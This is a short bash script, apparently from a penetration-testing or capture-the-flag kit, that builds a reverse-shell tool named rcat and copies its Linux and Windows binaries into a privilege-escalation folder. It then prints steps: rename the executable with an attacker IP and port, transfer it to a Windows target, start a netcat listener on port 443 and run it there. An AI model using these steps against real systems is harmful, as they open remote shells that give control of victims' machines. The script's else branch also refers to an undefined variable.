#!/usr/bin/bash

# This script prepares tools and links for LFI exploitation

dest="privesc"
source="/opt/reverse/rcat"

project_current=$PWD

if [[ -d $PWD/$dest ]] && [[ -d $source ]]
then

    cd $source
    make clean && make 
    cd $project_current

    cp $source/target/x86_64-pc-windows-gnu/release/rcat.exe $PWD/$dest 
    cp $source/target/release/rcat $PWD/$dest 
    echo ""
    echo "Copying rcat...done"
    echo ""
    ls $PWD/$dest 
    echo ""
    echo "(Kali) cp rcat.exe rcat_10.8.0.251_443.exe"
    echo "(Windows) Do some filetransfer" 
    echo "(Kali) rlwrap nc -lvnp 443"
    echo "(Windows) ./rcat_10.8.0.251_443.exe" 


else
echo "No $dir directory exists"
fi


